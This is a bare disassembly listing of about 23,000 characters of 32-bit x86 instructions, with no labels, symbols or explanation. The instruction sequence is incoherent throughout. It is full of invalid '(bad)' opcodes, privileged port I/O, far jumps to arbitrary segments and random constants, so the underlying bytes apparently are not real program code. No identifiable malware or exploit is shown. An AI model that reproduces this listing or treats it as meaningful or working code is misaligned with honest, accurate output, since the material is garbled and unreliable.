  446b20:	sbb    BYTE PTR [ebx-0x62cddf72],ch
  446b26:	repnz call 0x661d:0x1be19e1
  446b2e:	and    dl,al
  446b30:	mov    esp,0x1ff9fb6a
  446b35:	add    dl,BYTE PTR [edx+0x221077f4]
  446b3b:	clc    
  446b3c:	call   0x8402:0xca0abac2
  446b43:	adc    eax,0xf2440f81
  446b48:	shr    DWORD PTR [ecx+ebp*1],1
  446b4b:	test   al,0x4f
  446b4d:	inc    edi
  446b4e:	ja     0x446afb
  446b50:	(bad)  
  446b51:	lods   eax,DWORD PTR es:[esi]
  446b53:	lahf   
  446b54:	repnz and ebp,esi
  446b57:	mov    esi,0x6c2a9f5a
  446b5c:	or     BYTE PTR [edi+0xc],cl
  446b5f:	scas   eax,DWORD PTR es:[edi]
  446b60:	cmp    esp,esp
  446b62:	push   cs
  446b63:	mov    ah,0x85
  446b65:	ror    DWORD PTR [edi+0x6a],cl
  446b68:	aam    0x2b
  446b6a:	in     eax,0x91
  446b6c:	pop    ss
  446b6d:	mov    ds:0x9db71d1f,al
  446b72:	or     al,0x40
  446b74:	or     edi,DWORD PTR [eax]
  446b76:	mov    ebx,0xa775c14a
  446b7b:	sub    BYTE PTR [edi],ch
  446b7d:	sbb    al,0x69
  446b7f:	fadd   st,st(5)
  446b81:	push   0x828e52ed
  446b86:	test   bl,dh
  446b88:	add    ecx,DWORD PTR [edx]
  446b8a:	lds    esi,FWORD PTR [esi+eiz*8+0x2]
  446b8e:	push   esi
  446b8f:	int    0x3
  446b91:	aas    
  446b92:	sbb    esi,ebx
  446b94:	xlat   BYTE PTR ds:[ebx]
  446b95:	mov    ch,0x1f
  446b97:	xchg   BYTE PTR [ebx],bh
  446b99:	mov    ah,0xff
  446b9b:	test   DWORD PTR [ebp-0x5d],esi
  446b9e:	and    eax,0x388d8e28
  446ba3:	pop    esi
  446ba4:	dec    eax
  446ba5:	lods   al,BYTE PTR ds:[esi]
  446ba6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  446ba7:	sub    eax,0x6da88fe8
  446bac:	xor    DWORD PTR [eax*4+0x5ba46acf],ecx
  446bb3:	inc    DWORD PTR [esi]
  446bb5:	fld    TBYTE PTR [edx]
  446bb7:	jo     0x446b55
  446bb9:	ret    
  446bba:	cmp    DWORD PTR [ebx],0x4074c2f1
  446bc0:	stos   BYTE PTR es:[edi],al
  446bc1:	(bad)  
  446bc2:	pop    esp
  446bc3:	xchg   ebx,eax
  446bc4:	jmp    0x90e6:0x65840ff4
  446bcb:	xlat   BYTE PTR ds:[ebx]
  446bcc:	fmulp  st(4),st
  446bce:	push   eax
  446bcf:	js     0x446c02
  446bd1:	daa    
  446bd2:	aaa    
  446bd3:	mov    al,0xd
  446bd5:	sub    bh,BYTE PTR ss:[eax-0x14]
  446bd9:	fisubr WORD PTR [edx+0x3a05ca7f]
  446bdf:	inc    edx
  446be0:	xor    BYTE PTR [eax+0x27],0xbd
  446be4:	ret    0x3365
  446be7:	popa   
  446be8:	push   es
  446be9:	(bad)  
  446beb:	or     eax,0x476bbf4c
  446bf0:	shr    BYTE PTR [edi],0x30
  446bf3:	mov    DWORD PTR [edx-0x78],edx
  446bf6:	loopne 0x446c26
  446bf8:	repnz pop ebx
  446bfa:	jae    0x446c12
  446bfc:	mov    esp,0x98c326ba
  446c01:	pop    ebx
  446c02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446c03:	pop    esi
  446c04:	rcr    BYTE PTR [edi-0x58d9d15f],0x4d
  446c0b:	test   DWORD PTR [ebx*2+0x6b1e96ed],edx
  446c12:	pop    ss
  446c13:	popa   
  446c14:	mov    bh,0xb8
  446c16:	xchg   ebx,eax
  446c17:	or     DWORD PTR [edx+0x66e92712],esp
  446c1d:	aas    
  446c1e:	scas   al,BYTE PTR es:[edi]
  446c1f:	push   esi
  446c20:	mov    DWORD PTR [esi+eax*2],esp
  446c23:	cld    
  446c24:	das    
  446c25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446c26:	xor    BYTE PTR [ebp+0x47],bh
  446c29:	or     eax,eax
  446c2b:	mov    cl,0x1f
  446c2d:	out    0x17,eax
  446c2f:	loope  0x446c1a
  446c31:	cld    
  446c32:	xor    ebx,DWORD PTR [eax-0x605c6f2]
  446c38:	int3   
  446c39:	push   ebx
  446c3a:	xor    al,0x13
  446c3c:	fcomi  st,st(2)
  446c3e:	shl    DWORD PTR [ebx+0x18],0xeb
  446c42:	movlps QWORD PTR [ebx+0x2c435ab3],xmm0
  446c49:	mov    BYTE PTR [ecx],ch
  446c4b:	pop    ss
  446c4c:	nop
  446c4d:	pop    eax
  446c4e:	imul   ecx,DWORD PTR [ebx],0xffffff8c
  446c51:	mov    ch,BYTE PTR [esi]
  446c53:	inc    eax
  446c54:	xor    ecx,esp
  446c56:	jp     0x446c47
  446c58:	cwde   
  446c59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446c5a:	pop    esi
  446c5b:	mov    BYTE PTR [ecx-0x580acc22],cl
  446c61:	pushf  
  446c62:	aas    
  446c63:	mov    edi,0x82d4d8cc
  446c68:	sbb    bl,0x19
  446c6b:	mov    ds,WORD PTR [edx-0x7892a8f6]
  446c71:	in     al,dx
  446c72:	enter  0xca90,0x50
  446c76:	xchg   ecx,eax
  446c77:	hlt    
  446c78:	adc    eax,0x17c0ffc9
  446c7d:	std    
  446c7e:	stc    
  446c7f:	imul   edx,DWORD PTR [ebp+0x2d],0xb888ef40
  446c86:	inc    eax
  446c87:	call   eax
  446c89:	(bad)  
  446c8a:	xlat   BYTE PTR ds:[ebx]
  446c8b:	jnp    0x446c7f
  446c8d:	adc    dl,ch
  446c8f:	push   edi
  446c90:	mov    DWORD PTR [edx],ecx
  446c92:	and    dl,BYTE PTR ds:0xd8bfcfeb
  446c98:	sub    esi,DWORD PTR [ecx+ecx*4+0x48]
  446c9c:	xchg   edx,eax
  446c9d:	das    
  446c9e:	xchg   BYTE PTR [edx+0x39],dh
  446ca1:	es pop ebx
  446ca3:	div    DWORD PTR [esi-0xcdee976]
  446ca9:	fdiv   QWORD PTR cs:[edi]
  446cad:	xor    bh,BYTE PTR [ecx]
  446caf:	mov    esp,0xeb66ff4b
  446cb4:	outs   dx,BYTE PTR ds:[esi]
  446cb5:	pusha  
  446cb6:	dec    eax
  446cb7:	or     al,cl
  446cb9:	inc    ecx
  446cba:	dec    ebx
  446cbb:	or     ecx,edx
  446cbd:	imul   ebp,DWORD PTR [edx-0x72],0x6f90885
  446cc4:	ret    0x696d
  446cc7:	or     bh,BYTE PTR [edx]
  446cc9:	lods   al,BYTE PTR ds:[esi]
  446cca:	sbb    al,0x99
  446ccc:	ins    BYTE PTR es:[edi],dx
  446ccd:	shl    BYTE PTR [edx-0x345d0257],1
  446cd3:	pop    edi
  446cd4:	jl     0x446c96
  446cd6:	out    dx,eax
  446cd7:	xor    DWORD PTR [ecx-0x2989d3cc],eax
  446cdd:	xor    edx,ebx
  446cdf:	cmp    bh,BYTE PTR [edi-0x4d04ec75]
  446ce5:	mov    dh,0xd1
  446ce7:	fstp   TBYTE PTR [edx+0x6aba868a]
  446ced:	xchg   DWORD PTR [esi+0x433fe139],edx
  446cf3:	fwait
  446cf4:	push   ebx
  446cf5:	xchg   ebp,eax
  446cf6:	ret    0x8781
  446cf9:	pop    ebx
  446cfa:	pop    ss
  446cfb:	scas   eax,DWORD PTR es:[edi]
  446cfc:	dec    eax
  446cfd:	imul   dl
  446cff:	imul   BYTE PTR [esi]
  446d01:	pop    edi
  446d02:	mov    edi,0xf983a8e5
  446d07:	add    al,al
  446d09:	dec    eax
  446d0a:	adc    ebp,esi
  446d0c:	push   ebx
  446d0d:	and    DWORD PTR [ebx+0x1218be74],eax
  446d13:	dec    ebp
  446d14:	inc    esi
  446d15:	jge    0x446cab
  446d17:	mov    ds:0xc9e1ed1c,eax
  446d1c:	or     DWORD PTR [ecx+0x9277ea1],esi
  446d22:	jge    0x446d92
  446d24:	mov    cl,0x98
  446d26:	lods   eax,DWORD PTR ds:[esi]
  446d27:	push   esp
  446d28:	retf   
  446d29:	push   0xfffffff3
  446d2b:	cmc    
  446d2c:	fs pusha 
  446d2e:	inc    ebp
  446d2f:	add    ebx,DWORD PTR [edx]
  446d31:	jg     0x446d7f
  446d33:	icebp  
  446d34:	addr16 sub ah,cl
  446d37:	xchg   edi,eax
  446d38:	lahf   
  446d39:	fwait
  446d3a:	dec    ebp
  446d3b:	stc    
  446d3c:	out    0xf2,al
  446d3e:	mov    ecx,fs
  446d40:	div    BYTE PTR [eax-0x4d5ff630]
  446d46:	pushf  
  446d47:	es sub edi,0x307ed085
  446d4e:	mov    esp,0xa675b573
  446d53:	out    dx,eax
  446d54:	pop    edx
  446d55:	jp     0x446db0
  446d57:	sbb    edx,DWORD PTR [edi]
  446d59:	aas    
  446d5a:	cmp    DWORD PTR [eax+ebx*2-0x12dfe1f7],0x1f
  446d62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446d63:	jl     0x446d54
  446d65:	sub    al,0x75
  446d67:	push   cs
  446d68:	inc    eax
  446d69:	jl     0x446d3f
  446d6b:	scas   al,BYTE PTR es:[edi]
  446d6c:	retf   
  446d6d:	sbb    ecx,DWORD PTR [ebp+0x6598261b]
  446d73:	jp     0x446d0a
  446d75:	popf   
  446d76:	lea    esp,[edi+ebp*1-0x3e]
  446d7a:	enter  0xa088,0x8f
  446d7e:	xor    DWORD PTR [esi],eax
  446d80:	xor    al,BYTE PTR [edx+0x52]
  446d83:	pop    es
  446d84:	mov    es,WORD PTR [ebp+0x60690679]
  446d8a:	fistp  QWORD PTR [ebp+0x2f]
  446d8d:	jne    0x446db4
  446d8f:	sub    dl,BYTE PTR [edi-0x57]
  446d92:	mul    DWORD PTR [edi]
  446d94:	adc    ecx,DWORD PTR [edx-0x4a4d73ab]
  446d9a:	test   eax,0x7808d25f
  446d9f:	cmp    DWORD PTR [edx-0x58e9b64b],ecx
  446da5:	sbb    BYTE PTR [ecx+0x43f20444],cl
  446dab:	nop
  446dac:	add    DWORD PTR [ebx-0x4dc542ff],edx
  446db2:	push   ebp
  446db3:	enter  0xbfc0,0xc8
  446db7:	xchg   edx,eax
  446db8:	leave  
  446db9:	cld    
  446dba:	stos   BYTE PTR es:[edi],al
  446dbb:	fwait
  446dbc:	int3   
  446dbd:	pop    esi
  446dbe:	gs dec ebx
  446dc0:	xor    cl,BYTE PTR [ecx]
  446dc2:	arpl   WORD PTR [ebp+0x4eff9518],sp
  446dc8:	gs pop ebp
  446dca:	sbb    DWORD PTR [ebp+0x52],edx
  446dcd:	cmp    al,0x57
  446dcf:	jo     0x446dd3
  446dd1:	inc    edi
  446dd2:	mov    esi,0xce1f8b85
  446dd7:	hlt    
  446dd8:	popa   
  446dd9:	push   eax
  446dda:	(bad)  
  446ddb:	inc    ebp
  446ddc:	cli    
  446ddd:	jle    0x446d93
  446ddf:	lock icebp 
  446de1:	dec    ecx
  446de2:	call   0xe1504b0c
  446de7:	repz enter 0x5a73,0x13
  446dec:	cmp    BYTE PTR [ebp+0x4e],ch
  446def:	add    eax,0xba177da1
  446df4:	test   al,0x60
  446df6:	xchg   BYTE PTR [ecx],bl
  446df8:	js     0x446d7d
  446dfa:	cmp    ch,BYTE PTR [ecx]
  446dfc:	jo     0x446df0
  446dfe:	sub    eax,0x5ade121c
  446e03:	xlat   BYTE PTR ds:[ebx]
  446e04:	mov    esp,0xf305e8b2
  446e09:	cld    
  446e0a:	push   esi
  446e0b:	cdq    
  446e0c:	add    dh,BYTE PTR [ebp-0x47]
  446e0f:	pop    esp
  446e10:	ror    DWORD PTR [esi],0xd2
  446e13:	clc    
  446e14:	out    0xb,eax
  446e16:	scas   al,BYTE PTR es:[edi]
  446e17:	aad    0xc2
  446e19:	push   ebp
  446e1a:	cwde   
  446e1b:	ss jnp 0x446dc6
  446e1e:	jmp    0x2815:0x5c2df232
  446e25:	mov    ebp,0xe39b505a
  446e2a:	cmp    eax,0x62bb63db
  446e2f:	adc    al,0xd7
  446e31:	arpl   WORD PTR [ebx+edx*2+0x62],sp
  446e35:	adc    BYTE PTR [esi-0x213b79d4],bl
  446e3b:	push   esi
  446e3c:	(bad)  
  446e3d:	stos   BYTE PTR es:[edi],al
  446e3e:	inc    esp
  446e3f:	popa   
  446e40:	and    eax,0xd8f03d02
  446e45:	arpl   WORD PTR [ebx-0x79],bp
  446e48:	aas    
  446e49:	and    DWORD PTR [edx-0x41],0x31
  446e4d:	lock mov ch,0x5f
  446e50:	sbb    eax,0xaf97239b
  446e55:	mov    edx,0x1a045f94
  446e5a:	sbb    edi,DWORD PTR [edx-0x2d]
  446e5d:	addr16 xor al,0xec
  446e60:	outs   dx,DWORD PTR ds:[esi]
  446e61:	dec    eax
  446e62:	dec    esp
  446e63:	iret   
  446e64:	mov    bh,0xf3
  446e66:	(bad)  [esi-0x71bef11c]
  446e6c:	push   0x5d
  446e6e:	or     eax,0xd3e1aadf
  446e73:	out    0xf4,al
  446e75:	ss add al,0x1f
  446e78:	cmp    al,0x58
  446e7a:	push   esp
  446e7b:	(bad)  
  446e7c:	jmp    0x42562f24
  446e81:	sub    ebx,DWORD PTR [ecx]
  446e83:	fcomp  DWORD PTR [ebp+0x4f23d610]
  446e89:	mov    bh,0x58
  446e8b:	or     esp,DWORD PTR [ecx+0x1f134faa]
  446e91:	fstp   TBYTE PTR ds:0x31f5d7cf
  446e97:	(bad)  
  446e98:	std    
  446e99:	(bad)
  446e9f:	add    DWORD PTR [edi],esp
  446ea1:	and    ch,BYTE PTR [ebp+0x75c2a09b]
  446ea7:	ficomp DWORD PTR [edx]
  446ea9:	test   al,0x92
  446eab:	es retf 
  446ead:	push   0x612d5d9e
  446eb2:	es xor eax,0xa3c6bd86
  446eb8:	jmp    0xb827e41f
  446ebd:	das    
  446ebe:	inc    esp
  446ebf:	into   
  446ec0:	lods   eax,DWORD PTR ds:[esi]
  446ec1:	adc    DWORD PTR [eax-0x48f78034],edi
  446ec7:	dec    ebp
  446ec8:	jge    0x446ea7
  446eca:	je     0x446eb0
  446ecc:	jns    0x446f31
  446ece:	shl    dl,1
  446ed0:	shr    DWORD PTR [ecx+0x54],cl
  446ed3:	lock cmp eax,0xe29e320c
  446ed9:	push   es
  446eda:	outs   dx,DWORD PTR ds:[esi]
  446edb:	ins    DWORD PTR es:[edi],dx
  446edc:	sbb    eax,0xc354e308
  446ee1:	mov    edx,0x9c785898
  446ee6:	sbb    DWORD PTR [ebx-0xdff59b],esi
  446eec:	les    ebx,FWORD PTR [ecx]
  446eee:	xchg   BYTE PTR ds:0x9ce7913f,ch
  446ef4:	fild   WORD PTR [ecx-0x57]
  446ef7:	add    al,0x2d
  446ef9:	jge    0x446f42
  446efb:	pop    eax
  446efc:	mov    dl,0x8c
  446efe:	lods   al,BYTE PTR ds:[esi]
  446eff:	mov    cl,0x55
  446f01:	ds inc eax
  446f03:	dec    eax
  446f04:	dec    ebp
  446f05:	or     eax,DWORD PTR [edi-0x77]
  446f08:	(bad)  
  446f09:	(bad)  
  446f0b:	mov    ebx,0x8b60d977
  446f10:	add    eax,0xc2cdd877
  446f15:	rol    dl,0x3d
  446f18:	pop    ebx
  446f19:	cs jmp 0x8668cbf5
  446f1f:	xchg   ebx,eax
  446f20:	(bad)  
  446f21:	mov    ss:0x66b14506,eax
  446f27:	faddp  st(2),st
  446f29:	inc    esi
  446f2a:	into   
  446f2b:	mov    eax,0xc9884afb
  446f30:	dec    edx
  446f31:	cmp    al,0x17
  446f33:	inc    esp
  446f34:	add    al,0xe3
  446f36:	js     0x446f4d
  446f38:	icebp  
  446f39:	bound  ebp,QWORD PTR [ebx-0x4b0a0c58]
  446f3f:	scas   al,BYTE PTR es:[edi]
  446f40:	out    dx,al
  446f41:	mov    edi,0x9aa8fa1d
  446f46:	ss (bad) 
  446f48:	sub    cl,BYTE PTR [eax-0x72b43f39]
  446f4e:	mov    ds:0x8dccec84,eax
  446f53:	ins    DWORD PTR es:[edi],dx
  446f54:	loopne 0x446f97
  446f56:	mov    edi,0xb657e1df
  446f5b:	jp     0x446f50
  446f5d:	xchg   edi,eax
  446f5e:	cdq    
  446f5f:	push   ss
  446f60:	inc    esi
  446f61:	xchg   DWORD PTR [eax-0x20],edx
  446f64:	pop    eax
  446f65:	jb     0x446f17
  446f67:	xchg   edi,eax
  446f68:	adc    esi,DWORD PTR [ebx-0x298c219c]
  446f6e:	aaa    
  446f6f:	ja     0x446fc9
  446f71:	or     DWORD PTR [ecx],edx
  446f73:	popf   
  446f74:	xchg   DWORD PTR [edi-0x71bddff4],esi
  446f7a:	shl    DWORD PTR [eax-0x7c9cbb4c],0xff
  446f81:	outs   dx,BYTE PTR ds:[esi]
  446f82:	dec    edi
  446f83:	sub    dl,ah
  446f85:	inc    edx
  446f86:	(bad)  
  446f87:	mov    ebx,0x6c8f5fee
  446f8c:	lods   al,BYTE PTR ds:[esi]
  446f8d:	scas   eax,DWORD PTR es:[edi]
  446f8e:	sub    cl,BYTE PTR [ecx]
  446f90:	push   ds
  446f91:	loop   0x446fed
  446f93:	pusha  
  446f94:	iret   
  446f95:	xchg   BYTE PTR [esi-0x61],ch
  446f98:	mov    edi,0xd39998e5
  446f9d:	mov    ds:0xfb3edda1,eax
  446fa2:	push   cs
  446fa3:	xchg   ebx,eax
  446fa4:	adc    al,BYTE PTR [edi-0x16610e40]
  446faa:	pop    esp
  446fab:	pop    ds
  446fac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  446fad:	iret   
  446fae:	enter  0xc8be,0xd9
  446fb2:	pop    esi
  446fb3:	mov    ds:0x8889e92c,al
  446fb8:	jecxz  0x447015
  446fba:	mov    esp,DWORD PTR [edi-0x11]
  446fbd:	repz sub ch,ah
  446fc0:	mov    esp,0xcbac8ce3
  446fc5:	jo     0x446f51
  446fc7:	repnz or al,0xa3
  446fca:	test   eax,0x2ae39172
  446fcf:	lods   eax,DWORD PTR ds:[esi]
  446fd0:	lods   eax,DWORD PTR ds:[esi]
  446fd1:	scas   eax,DWORD PTR es:[edi]
  446fd2:	int3   
  446fd3:	mov    DWORD PTR [ecx+0x25821553],0x4574e2a1
  446fdd:	xchg   ebx,eax
  446fde:	cmp    al,0x55
  446fe0:	xor    edx,0xffffffb5
  446fe3:	jae    0x44704d
  446fe5:	ret    
  446fe6:	cli    
  446fe7:	sbb    eax,0xfe479806
  446fec:	cmp    eax,0xfba3bf21
  446ff1:	int    0x9b
  446ff3:	daa    
  446ff4:	fiadd  DWORD PTR [ebp-0x69]
  446ff7:	pop    esi
  446ff8:	(bad)  
  446ff9:	push   ds
  446ffa:	jbe    0x446fa4
  446ffc:	(bad)  
  446ffd:	jmp    0x25d9:0x29cb3919
  447004:	adc    BYTE PTR [edi],bh
  447006:	pop    edi
  447007:	jnp    0x447019
  447009:	push   ecx
  44700a:	add    DWORD PTR [ebx+0x6c82a534],ecx
  447010:	xor    al,0x1b
  447012:	inc    edi
  447013:	jno    0x446fb4
  447015:	ins    BYTE PTR es:[edi],dx
  447016:	ror    BYTE PTR ds:[ebx-0x48bf2e5a],1
  44701d:	or     DWORD PTR [edx-0x3d],ebp
  447020:	mov    eax,0x26979244
  447025:	ds loopne 0x44709c
  447028:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447029:	add    ecx,DWORD PTR [esi+0x23]
  44702c:	mov    edx,0xca7efa53
  447031:	dec    eax
  447032:	(bad)  
  447033:	in     eax,0xe0
  447035:	out    dx,al
  447036:	and    ch,BYTE PTR ds:0x40d3c280
  44703c:	push   0x175598ec
  447041:	dec    edx
  447042:	aaa    
  447043:	sar    ch,0x1
  447046:	ret    
  447047:	sti    
  447048:	sub    DWORD PTR [ebp+esi*1+0x52d14974],0xffffffe0
  447050:	dec    esi
  447051:	adc    al,0x9b
  447053:	push   eax
  447054:	iret   
  447055:	(bad)  
  447056:	arpl   WORD PTR [esi-0x5fdd030],sp
  44705c:	popf   
  44705d:	pop    ebp
  44705e:	xchg   ebx,eax
  44705f:	pop    ebx
  447060:	xor    ah,BYTE PTR [eax-0x5f]
  447063:	mov    ecx,DWORD PTR [esi-0x77]
  447066:	ds jge 0x4470e2
  447069:	xor    DWORD PTR [esi+eiz*8+0x36],esp
  44706d:	idiv   DWORD PTR [ebp+0x9121dac]
  447073:	sbb    BYTE PTR [eax],dl
  447075:	push   ebp
  447076:	pop    ss
  447077:	or     dl,ah
  447079:	movaps xmm3,xmm0
  44707c:	stc    
  44707d:	push   ds
  44707e:	inc    ebp
  44707f:	in     eax,dx
  447080:	int    0x52
  447082:	scas   eax,DWORD PTR es:[edi]
  447083:	sub    ebp,DWORD PTR [edi+0x103ff894]
  447089:	xor    esp,esi
  44708b:	in     al,0x59
  44708d:	push   edi
  44708e:	bnd je 0x447092
  447091:	js     0x447026
  447093:	inc    edi
  447094:	jmp    0x4470a2
  447096:	mov    ds,WORD PTR [ecx+0x58]
  447099:	data16 aaa 
  44709b:	and    ch,BYTE PTR [edi+0x2d505b70]
  4470a1:	lods   al,BYTE PTR ds:[esi]
  4470a2:	pop    eax
  4470a3:	cmp    esp,DWORD PTR [ebp-0x50]
  4470a6:	push   es
  4470a7:	addr16 xchg ebp,eax
  4470a9:	sbb    esp,eax
  4470ab:	int3   
  4470ac:	pop    ebx
  4470ad:	mov    bh,0x70
  4470af:	pop    eax
  4470b0:	jge    0x4470a3
  4470b2:	push   0x38753c53
  4470b7:	sub    bl,BYTE PTR [eax]
  4470b9:	or     eax,0x2ca24767
  4470be:	enter  0x7afc,0x8e
  4470c2:	pop    ecx
  4470c3:	inc    edx
  4470c4:	inc    ebp
  4470c5:	in     al,0x2a
  4470c7:	jg     0x4470c6
  4470c9:	add    al,0x48
  4470cb:	cld    
  4470cc:	(bad)
  4470d0:	ror    DWORD PTR [edx+edi*8+0x15],cl
  4470d4:	scas   eax,DWORD PTR es:[edi]
  4470d5:	sbb    BYTE PTR [eax+0x63c75eec],ch
  4470db:	xchg   esi,eax
  4470dc:	sbb    bl,ch
  4470de:	data16 or cl,BYTE PTR [edx+0x2e]
  4470e2:	pop    ss
  4470e3:	js     0x44712c
  4470e5:	sbb    DWORD PTR [esi-0x53],esi
  4470e8:	daa    
  4470e9:	es mov bl,0x36
  4470ec:	dec    eax
  4470ed:	xor    ch,BYTE PTR [edi-0x3b]
  4470f0:	stc    
  4470f1:	hlt    
  4470f2:	xchg   BYTE PTR [ebx+esi*1-0x7],al
  4470f6:	in     al,0xfd
  4470f8:	repz in al,0x87
  4470fb:	nop
  4470fc:	hlt    
  4470fd:	mov    ah,al
  4470ff:	in     eax,0x63
  447101:	adc    DWORD PTR [esp+ecx*4-0x16813451],esp
  447108:	retf   0xa492
  44710b:	sbb    ebx,esi
  44710d:	jmp    0x889f:0xef883e
  447114:	(bad)  
  447115:	mov    al,0xe5
  447117:	stc    
  447118:	lock cmp BYTE PTR [edi],al
  44711b:	pushf  
  44711c:	mov    bl,0xf3
  44711e:	call   DWORD PTR [ebp-0x7a]
  447121:	scas   al,BYTE PTR es:[edi]
  447122:	lock inc ebp
  447124:	adc    BYTE PTR [edx],bl
  447126:	inc    esi
  447127:	in     al,dx
  447128:	mov    cl,0x6d
  44712a:	ret    
  44712b:	aam    0x27
  44712d:	call   0x5e3a44f5
  447132:	dec    ecx
  447133:	jecxz  0x4470b5
  447135:	repnz add al,0xe4
  447138:	pop    ss
  447139:	inc    ebx
  44713a:	mov    BYTE PTR [edx],al
  44713c:	lods   eax,DWORD PTR ds:[esi]
  44713d:	sbb    eax,0xb7eba55e
  447142:	arpl   dx,bp
  447144:	jns    0x447116
  447146:	(bad)  
  447148:	fisttp QWORD PTR [esi]
  44714a:	or     BYTE PTR [esi],al
  44714c:	popf   
  44714d:	(bad)  
  44714e:	in     eax,0x1b
  447150:	ror    eax,0xe5
  447153:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447154:	hlt    
  447155:	clc    
  447156:	fbld   TBYTE PTR [ecx-0x70501d86]
  44715c:	xor    al,0x1f
  44715e:	fst    QWORD PTR es:[ecx]
  447161:	adc    bh,BYTE PTR [edi-0x5e]
  447164:	and    ebx,DWORD PTR [ebx+edi*1+0x235b03bd]
  44716b:	jbe    0x44710c
  44716d:	add    dh,BYTE PTR [esi-0x7b2a247]
  447173:	add    al,0x9a
  447175:	(bad)  
  447176:	jmp    0x44711e
  447178:	and    al,0x3
  44717a:	ds xchg esp,eax
  44717c:	sub    eax,0x179b1936
  447181:	mov    ebx,0xb81155e8
  447186:	sbb    edx,DWORD PTR [edx]
  447188:	ins    BYTE PTR es:[edi],dx
  447189:	jns    0x447184
  44718b:	xchg   esi,eax
  44718c:	jno    0x4471ea
  44718e:	shl    DWORD PTR [esi+0x2],1
  447191:	and    ebx,DWORD PTR [edi+0x12782b58]
  447197:	add    BYTE PTR [ecx+ecx*2],bh
  44719a:	(bad)  
  44719b:	xchg   edi,eax
  44719c:	in     al,dx
  44719d:	test   BYTE PTR [ebx],al
  44719f:	inc    edi
  4471a0:	(bad)  
  4471a1:	ficom  DWORD PTR [ebx]
  4471a3:	add    BYTE PTR [ebx-0x60],ch
  4471a6:	mov    dh,BYTE PTR [esi-0x9acee99]
  4471ac:	test   edx,ebx
  4471ae:	lock enter 0x4d9f,0x35
  4471b3:	aam    0xb1
  4471b5:	test   al,0x5e
  4471b7:	add    edx,DWORD PTR [esi]
  4471b9:	aam    0x1f
  4471bb:	push   cs
  4471bc:	add    DWORD PTR [edi],eax
  4471be:	jle    0x447180
  4471c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4471c1:	jbe    0x4471de
  4471c3:	push   esp
  4471c4:	sub    WORD PTR [ecx],0x368b
  4471c9:	fs sbb edi,esi
  4471cc:	jmp    0x4471d5
  4471ce:	hlt    
  4471cf:	mov    ebp,0x295a3c6b
  4471d4:	clc    
  4471d5:	mov    bh,0xb2
  4471d7:	clc    
  4471d8:	dec    esp
  4471d9:	mov    ch,0xb6
  4471db:	jge    0x447165
  4471dd:	retf   
  4471de:	dec    eax
  4471df:	pop    ds
  4471e0:	sub    eax,0x96a545c0
  4471e5:	pushf  
  4471e6:	popa   
  4471e7:	xor    esi,DWORD PTR [eax]
  4471e9:	add    ah,bh
  4471eb:	bound  ebx,QWORD PTR [ecx+0x41]
  4471ee:	mov    edi,0xf37a6380
  4471f3:	test   al,0xba
  4471f5:	mov    esi,0x85515819
  4471fa:	aam    0x21
  4471fc:	(bad)  
  4471fd:	es repnz dec edx
  447200:	(bad)  
  447201:	ja     0x44727f
  447203:	push   0x728a7090
  447208:	loop   0x44722a
  44720a:	xchg   BYTE PTR [ebp-0x39fedc8],cl
  447210:	in     al,0xb3
  447212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447213:	xchg   esi,eax
  447214:	aas    
  447215:	sbb    al,bl
  447217:	cs ins BYTE PTR es:[edi],dx
  447219:	stc    
  44721a:	arpl   di,cx
  44721c:	aam    0xd1
  44721e:	adc    eax,DWORD PTR [edx+0x7f6280dc]
  447224:	jg     0x44722f
  447226:	fdiv   DWORD PTR [esp+eax*1-0x767e6560]
  44722d:	cs (bad) 
  44722f:	lock push cs
  447231:	(bad)  
  447232:	sar    DWORD PTR [eax-0x55],1
  447235:	and    DWORD PTR [ebp+0x43045436],0xcd4a01db
  44723f:	xchg   BYTE PTR [ecx-0x35],dh
  447242:	sbb    bh,BYTE PTR [eax]
  447244:	lock mov eax,ds:0x3b7987c0
  44724a:	inc    ebx
  44724b:	cld    
  44724c:	sbb    dh,BYTE PTR [ebp+0x7c6a64c2]
  447252:	xor    al,0x7b
  447254:	mov    ebp,0xd08ca18e
  447259:	push   eax
  44725a:	mov    esp,0xed840b89
  44725f:	(bad)  
  447260:	mov    ebx,0x2b0f329a
  447265:	xchg   ebx,eax
  447266:	shl    DWORD PTR [esi],cl
  447268:	lgs    eax,FWORD PTR [edx]
  44726b:	fnstcw WORD PTR [edx]
  44726d:	call   0x20d5:0xf2ad6c0a
  447274:	push   edi
  447275:	mov    edi,0xeef4dfff
  44727a:	imul   ebx,DWORD PTR [ebx+0x2a4a5f8c],0x537bfa16
  447284:	inc    edi
  447285:	lds    ebp,FWORD PTR [ebx+0x6a376892]
  44728b:	jg     0x44724a
  44728d:	std    
  44728e:	dec    ecx
  44728f:	test   al,0x79
  447291:	push   edi
  447292:	xchg   ebx,eax
  447293:	dec    edi
  447294:	cmp    ecx,DWORD PTR [esi+0xd]
  447297:	xchg   edx,eax
  447298:	ins    DWORD PTR es:[edi],dx
  447299:	mov    edx,0x37aafcfc
  44729e:	test   al,0xde
  4472a0:	out    0xc6,al
  4472a2:	sbb    DWORD PTR [ebx*4+0x1bdfcbfb],ebx
  4472a9:	or     BYTE PTR [ebp+0x7ce85bee],al
  4472af:	pop    esi
  4472b0:	imul   esi,esi,0x92b9ff52
  4472b6:	lock out dx,eax
  4472b8:	dec    esi
  4472b9:	adc    ch,BYTE PTR [ebp+eiz*4-0x6ff10898]
  4472c0:	loop   0x4472e8
  4472c2:	jno    0x4472c2
  4472c4:	loopne 0x4472bc
  4472c6:	daa    
  4472c7:	mov    DWORD PTR [edi],ecx
  4472c9:	sbb    eax,0xd9a6b7a9
  4472ce:	xchg   esp,eax
  4472cf:	xchg   ecx,eax
  4472d0:	outs   dx,DWORD PTR ds:[esi]
  4472d1:	jecxz  0x44726b
  4472d3:	in     eax,dx
  4472d4:	fst    QWORD PTR ds:0xdd548748
  4472da:	and    al,0xa3
  4472dc:	mov    edi,0xa9b2f2d5
  4472e1:	hlt    
  4472e2:	sbb    bl,BYTE PTR fs:[edi-0x31]
  4472e6:	pop    es
  4472e7:	aaa    
